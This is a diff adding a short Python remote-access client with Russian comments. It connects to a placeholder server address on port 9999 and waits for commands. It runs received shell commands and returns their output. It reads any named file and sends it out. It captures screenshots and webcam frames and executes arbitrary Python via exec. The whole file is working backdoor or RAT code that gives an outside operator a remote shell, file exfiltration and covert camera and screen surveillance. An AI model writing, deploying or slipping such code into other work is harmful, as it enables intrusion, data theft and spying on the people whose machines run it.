@@ -1,0 +1,42 @@
+import socket, os, subprocess, pyautogui, cv2, pickle, struct
+from PIL import ImageGrab
+
+def start_client():
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect(('IP_СЕРВЕРА', 9999)) # Укажите IP сервера
+
+    while True:
+        cmd = client.recv(1024).decode()
+        
+        # Выполнение CMD команд
+        if cmd.startswith("cmd"):
+            res = subprocess.check_output(cmd[4:], shell=True)
+            client.send(res if res else b"Done")
+
+        # Чтение файла
+        elif cmd.startswith("read"):
+            with open(cmd[5:], "rb") as f:
+                client.send(f.read())
+
+        # Скриншот (Трансляция экрана упрощенно)
+        elif cmd == "screen":
+            img = ImageGrab.grab()
+            img.save("s.png")
+            with open("s.png", "rb") as f:
+                client.send(f.read())
+
+        # Камера (один кадр)
+        elif cmd == "cam":
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            cv2.imwrite("c.jpg", frame)
+            cap.release()
+            with open("c.jpg", "rb") as f:
+                client.send(f.read())
+
+        # Python код
+        elif cmd.startswith("py"):
+            exec(cmd[3:])
+            client.send(b"Executed")
+
+start_client()
